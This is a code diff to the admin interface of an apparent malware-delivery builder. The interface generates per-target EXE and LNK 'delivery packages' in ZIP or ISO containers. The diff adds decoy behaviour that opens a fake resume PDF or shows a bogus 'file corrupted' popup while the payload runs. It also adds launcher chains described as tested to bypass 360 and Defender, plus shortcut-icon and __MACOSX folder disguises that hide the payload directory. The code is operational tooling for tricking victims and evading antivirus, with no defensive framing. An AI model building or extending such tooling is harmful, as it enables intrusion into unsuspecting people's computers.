@@ -136,21 +136,25 @@
                                 </form>
                             </div>
                             {% endif %}
-                            {% if bypass_enabled and t.lnk_file %}
+                            {% set lnk_files = t.lnk_files or ([t.lnk_file] if t.lnk_file else []) %}
+                            {% if bypass_enabled %}
+                            {% for lnk_name in lnk_files %}
                             <div class="file-row">
-                                <a class="file-link is-lnk" href="{{ url_for('routes_bypass.download_lnk_from_target', target_id=t.id) }}" title="下载 {{ t.lnk_file }}">
-                                    <svg class="icon" aria-hidden="true"><use href="{{ '#i-hard-drive' if t.lnk_file.endswith('.iso') else '#i-archive' }}"></use></svg>
-                                    <span>{{ t.lnk_file }}</span>
+                                <a class="file-link is-lnk" href="{{ url_for('routes_bypass.download_lnk_from_target', target_id=t.id, file=lnk_name) }}" title="下载 {{ lnk_name }}">
+                                    <svg class="icon" aria-hidden="true"><use href="{{ '#i-hard-drive' if lnk_name.endswith('.iso') else '#i-archive' }}"></use></svg>
+                                    <span>{{ lnk_name }}</span>
                                 </a>
                                 <form class="file-del-form" action="{{ url_for('routes_bypass.delete_lnk_from_target', target_id=t.id) }}" method="POST"
-                                      data-confirm="确认删除投递包「{{ t.lnk_file }}」？" data-confirm-danger data-confirm-ok="删除">
-                                    <button class="file-x" type="submit" title="删除投递包" aria-label="删除 {{ t.lnk_file }}">
+                                      data-confirm="确认删除投递包「{{ lnk_name }}」？" data-confirm-danger data-confirm-ok="删除">
+                                    <input type="hidden" name="file" value="{{ lnk_name }}">
+                                    <button class="file-x" type="submit" title="删除投递包" aria-label="删除 {{ lnk_name }}">
                                         <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
                                     </button>
                                 </form>
                             </div>
+                            {% endfor %}
                             {% endif %}
-                            {% if not t.exe_file and not (bypass_enabled and t.lnk_file) %}
+                            {% if not t.exe_file and not (bypass_enabled and lnk_files) %}
                             <span class="file-empty">—</span>
                             {% endif %}
                         </div>
@@ -222,13 +226,34 @@
                 {% endif %}
             </div>
 
+            <div class="form-group" data-gen-filename-group>
+                <label for="genFilename">输出文件名</label>
+                <input id="genFilename" class="mono" type="text" data-gen-filename placeholder="留空则使用目标文件名或全局模板" autocomplete="off">
+                <span class="help">对本次生成生效，无需填写 <code>.exe</code> / <code>.zip</code> / <code>.iso</code> 后缀；批量生成会自动附加目标 token 后缀，避免重名。</span>
+            </div>
+            <p class="help" data-gen-batch-note hidden>批量生成会以该名称为前缀并附加每个目标的 token 后缀；留空则使用各目标已保存的文件名或全局模板。</p>
+
             <div class="gen-panel" data-gen-panel="exe">
-                <div class="form-group" data-gen-filename-group>
-                    <label for="genFilename">输出文件名</label>
-                    <input id="genFilename" class="mono" type="text" data-gen-filename placeholder="留空则使用目标文件名或全局模板" autocomplete="off">
-                    <span class="help">仅对本次生成生效，无需填写 <code>.exe</code> 后缀。</span>
+                <div class="form-group">
+                    <span class="form-label">运行后行为</span>
+                    <label style="margin-right: 18px;">
+                        <input type="checkbox" data-exe-open-toggle checked> 打开文件
+                    </label>
+                    <label>
+                        <input type="checkbox" data-exe-popup-toggle> 弹窗提示
+                    </label>
+                    <span class="help">默认打开文件；勾选几个执行几个，两个都勾选时先打开文件、再弹窗。</span>
                 </div>
-                <p class="help" data-gen-batch-note hidden>批量生成将对每个目标使用其已保存的文件名或全局名称模板，避免重名冲突。</p>
+                <div class="form-group" data-exe-open-group>
+                    <label for="genDecoyFile">打开默认文件（仅 EXE）</label>
+                    <input id="genDecoyFile" class="mono" type="text" data-exe-decoy value="C:\Users\Administrator\Downloads\李泽宇简历.pdf" placeholder="C:\Users\Administrator\Downloads\李泽宇简历.pdf" maxlength="260" autocomplete="off">
+                    <span class="help">填目标机绝对路径；不勾选此项则不会打开文件。内置 PDF 只会自动打包进 LNK 包，EXE 暂不内置。</span>
+                </div>
+                <div class="form-group is-hidden" data-exe-popup-group>
+                    <label for="genPopupMessage">弹窗提示文字</label>
+                    <input id="genPopupMessage" type="text" data-exe-popup value="文件损坏">
+                    <span class="help">不勾选弹窗则不会弹窗；留空使用配置页的弹窗文字。</span>
+                </div>
                 <div class="gen-preview">
                     <svg class="icon icon-sm" aria-hidden="true"><use href="#i-eye"></use></svg>
                     <span>预计输出</span>
@@ -253,6 +278,34 @@
                     </div>
                 </div>
                 <div class="form-group">
+                    <span class="form-label">运行后行为</span>
+                    <label style="margin-right: 18px;">
+                        <input type="checkbox" data-lnk-open-toggle checked> 打开内置 PDF
+                    </label>
+                    <label>
+                        <input type="checkbox" data-lnk-popup-toggle> 弹窗提示
+                    </label>
+                    <span class="help">默认打开内置 PDF；勾选几个执行几个，两个都勾选时先打开 PDF、再弹窗。</span>
+                </div>
+                <div class="form-group" data-lnk-open-group>
+                    <label>打开内置 PDF</label>
+                    <input class="mono" type="text" value="李泽宇简历.pdf（内置，自动打包）" disabled>
+                    <span class="help">LNK 包会把该 PDF 放进隐藏载荷目录并在运行时打开，无需目标机本地已有。</span>
+                </div>
+                <div class="form-group is-hidden" data-lnk-popup-group>
+                    <label for="genLnkPopup">弹窗提示文字</label>
+                    <input id="genLnkPopup" type="text" data-lnk-popup value="文件损坏" maxlength="200">
+                    <span class="help">只勾选此项时不打开 PDF；留空使用配置页的全局弹窗文字。</span>
+                </div>
+                <div class="form-group">
+                    <label for="genIcon">快捷方式图标</label>
+                    <select id="genIcon" data-lnk-icon>
+                        {% for key, label, desc in lnk_icon_options %}
+                        <option value="{{ key }}" {% if lnk_defaults.icon == key %}selected{% endif %}>{{ label }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                <div class="form-group">
                     <span class="form-label">投递容器</span>
                     <div class="container-grid">
                         {% for key, label, desc in lnk_container_choices %}
@@ -268,11 +321,36 @@
                     </div>
                 </div>
                 <div class="form-group">
-                    <span class="form-label">免杀方式</span>
+                    <span class="form-label">启动链</span>
+                    <div class="evasion-grid">
+                        {% for key, label, desc in lnk_launcher_options %}
+                        {% set result = lnk_launcher_results.get(key) %}
+                        <label class="evasion-option{% if result %} is-{{ 'ok' if result[0] else 'bad' }}{% endif %}">
+                            <input type="radio" name="gen_launcher" value="{{ key }}" data-launcher-key {% if lnk_defaults.launcher == key %}checked{% endif %}>
+                            <span class="evasion-text">
+                                <strong>{{ label }}</strong>
+                                <small>{{ desc }}</small>
+                            </span>
+                        </label>
+                        {% endfor %}
+                        {% for key, label, desc in lnk_launcher_disabled %}
+                        <label class="evasion-option is-disabled">
+                            <input type="radio" name="gen_launcher" value="{{ key }}" disabled>
+                            <span class="evasion-text">
+                                <strong><span>{{ label }}</span><span class="evasion-badge">不适用</span></strong>
+                                <small>{{ desc }}</small>
+                            </span>
+                        </label>
+                        {% endfor %}
+                    </div>
+                    <span class="help">六种启动链（含 CustomShellHost / WorkFolders / stordiag 主机）实测通过 360 + Defender；未通过的启动链置灰、不可选。ZIP 的载荷定位依赖桌面/下载/文档/OneDrive/公共/临时、盘根与微信/Tencent 目录搜索；需要投递到任意目录时请改用 ISO 容器。</span>
+                </div>
+                <div class="form-group">
+                    <span class="form-label">目录伪装</span>
                     <div class="evasion-grid">
                         {% for key, label, desc in lnk_evasion_options %}
-                        <label class="evasion-option{% if key == 'conhost' %} is-locked is-ok{% endif %}">
-                            <input type="checkbox" value="{{ key }}" data-evasion-key {% if key == 'conhost' %}checked disabled{% elif key in lnk_defaults.evasion %}checked{% endif %}>
+                        <label class="evasion-option">
+                            <input type="checkbox" value="{{ key }}" data-evasion-key {% if key in lnk_defaults.evasion %}checked{% endif %}>
                             <span class="evasion-text">
                                 <strong>{{ label }}</strong>
                                 <small>{{ desc }}</small>
@@ -280,7 +358,7 @@
                         </label>
                         {% endfor %}
                     </div>
-                    <span class="help">conhost 启动链始终启用；可叠加 __MACOSX 伪装隐藏载荷目录。</span>
+                    <span class="help">可与任意启动链叠加；ISO 容器建议启用 __MACOSX 伪装。</span>
                 </div>
                 <label class="switch">
                     <input type="checkbox" data-lnk-save>
@@ -438,13 +516,17 @@
         if (password) {
             password.value = LNK_DEFAULTS.password || '';
         }
+        var icon = root.querySelector('[data-lnk-icon]');
+        if (icon) {
+            icon.value = LNK_DEFAULTS.icon || 'auto';
+        }
         root.querySelectorAll('input[name="gen_container"]').forEach(function (input) {
             input.checked = input.value === LNK_DEFAULTS.container;
         });
+        root.querySelectorAll('[data-launcher-key]').forEach(function (input) {
+            input.checked = input.value === LNK_DEFAULTS.launcher;
+        });
         root.querySelectorAll('[data-evasion-key]').forEach(function (input) {
-            if (input.disabled) {
-                return;
-            }
             input.checked = (LNK_DEFAULTS.evasion || []).indexOf(input.value) !== -1;
         });
         {% endif %}
@@ -511,12 +593,58 @@
         updatePreviews(state);
     }
 
+    function behaviorValue(openChecked, popupChecked) {
+        if (openChecked && popupChecked) {
+            return 'both';
+        }
+        if (openChecked) {
+            return 'open_file';
+        }
+        if (popupChecked) {
+            return 'popup';
+        }
+        return 'none';
+    }
+
+    function syncBehaviorGroups(root) {
+        var exeOpen = root.querySelector('[data-exe-open-toggle]');
+        var exePopup = root.querySelector('[data-exe-popup-toggle]');
+        var exeOpenGroup = root.querySelector('[data-exe-open-group]');
+        var exePopupGroup = root.querySelector('[data-exe-popup-group]');
+        if (exeOpenGroup) {
+            exeOpenGroup.classList.toggle('is-hidden', !(exeOpen && exeOpen.checked));
+        }
+        if (exePopupGroup) {
+            exePopupGroup.classList.toggle('is-hidden', !(exePopup && exePopup.checked));
+        }
+        var lnkOpen = root.querySelector('[data-lnk-open-toggle]');
+        var lnkPopup = root.querySelector('[data-lnk-popup-toggle]');
+        var lnkOpenGroup = root.querySelector('[data-lnk-open-group]');
+        var lnkPopupGroup = root.querySelector('[data-lnk-popup-group]');
+        if (lnkOpenGroup) {
+            lnkOpenGroup.classList.toggle('is-hidden', !(lnkOpen && lnkOpen.checked));
+        }
+        if (lnkPopupGroup) {
+            lnkPopupGroup.classList.toggle('is-hidden', !(lnkPopup && lnkPopup.checked));
+        }
+    }
+
     function collectLnkOptions(root) {
         var container = root.querySelector('input[name="gen_container"]:checked');
+        var launcher = root.querySelector('input[name="gen_launcher"]:checked');
+        var icon = root.querySelector('[data-lnk-icon]');
+        var popup = root.querySelector('[data-lnk-popup]');
+        var openToggle = root.querySelector('[data-lnk-open-toggle]');
+        var popupToggle = root.querySelector('[data-lnk-popup-toggle]');
         return {
             lure_ext: root.querySelector('[data-lnk-lure]').value,
             container: container ? container.value : 'zip',
             password: root.querySelector('[data-lnk-password]').value.trim(),
+            launcher: launcher ? launcher.value : 'conhost',
+            icon: icon ? icon.value : 'auto',
+            popup_message: popup ? popup.value.trim() : '',
+            behavior: behaviorValue(!!(openToggle && openToggle.checked),
+                                    !!(popupToggle && popupToggle.checked)),
             evasion: Array.from(root.querySelectorAll('[data-evasion-key]:checked')).map(function (cb) {
                 return cb.value;
             }),
@@ -528,29 +656,49 @@
         var root = genBackdrop;
         var filenameInput = root.querySelector('[data-gen-filename]');
         var filename = filenameInput ? filenameInput.value.trim() : '';
+        var decoyInput = root.querySelector('[data-exe-decoy]');
+        var decoyFile = decoyInput ? decoyInput.value.trim() : '';
+        var popupInput = root.querySelector('[data-exe-popup]');
+        var popupMessage = popupInput ? popupInput.value.trim() : '';
+        var exeOpenToggle = root.querySelector('[data-exe-open-toggle]');
+        var exePopupToggle = root.querySelector('[data-exe-popup-toggle]');
+        var exeBehavior = behaviorValue(!!(exeOpenToggle && exeOpenToggle.checked),
+                                        !!(exePopupToggle && exePopupToggle.checked));
         var request;
 
         if (state.kind === 'exe' && state.mode === 'single') {
             request = fetch(ADMIN + '/targets/' + state.targetId + '/build_exe', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ filename: filename })
+                body: JSON.stringify({
+                    filename: filename,
+                    decoy_file: decoyFile,
+                    popup_message: popupMessage,
+                    behavior: exeBehavior
+                })
             });
         } else if (state.kind === 'exe') {
             var exeForm = new FormData();
             state.ids.forEach(function (id) { exeForm.append('ids[]', id); });
+            exeForm.append('filename', filename);
+            exeForm.append('decoy_file', decoyFile);
+            exeForm.append('popup_message', popupMessage);
+            exeForm.append('behavior', exeBehavior);
             request = fetch(ADMIN + '/targets/batch_build_exe', {
                 method: 'POST', body: exeForm
             });
         } else if (state.mode === 'single') {
+            var singleLnk = collectLnkOptions(root);
+            singleLnk.filename = filename;
             request = fetch(ADMIN + '/targets/' + state.targetId + '/build_lnk', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectLnkOptions(root))
+                body: JSON.stringify(singleLnk)
             });
         } else {
             var lnkForm = new FormData();
             state.ids.forEach(function (id) { lnkForm.append('ids[]', id); });
+            lnkForm.append('filename', filename);
             var options = collectLnkOptions(root);
             Object.keys(options).forEach(function (key) {
                 if (key === 'evasion') {
@@ -626,8 +774,7 @@
 
         if (state.mode === 'batch') {
             title.textContent = '批量生成投放文件';
-            sub.textContent = '已选择 ' + state.ids.length + ' 个目标 · 按目标配置逐个生成';
-            if (filenameGroup) filenameGroup.hidden = true;
+            sub.textContent = '已选择 ' + state.ids.length + ' 个目标 · 可统一指定输出名称前缀';
             if (batchNote) batchNote.hidden = false;
             submitBtn.querySelector('[data-gen-submit-label]').textContent = '生成 ' + state.ids.length + ' 个文件';
         } else {
@@ -638,12 +785,14 @@
 
         fillLnkDefaults(backdrop);
         syncContainerStyle(backdrop);
+        syncBehaviorGroups(backdrop);
         setKind(state, 'exe');
 
         backdrop.addEventListener('change', function (event) {
             if (event.target.matches('input[name="gen_container"]')) {
                 syncContainerStyle(backdrop);
             }
+            syncBehaviorGroups(backdrop);
             updatePreviews(state);
         });
         if (filenameInput) {
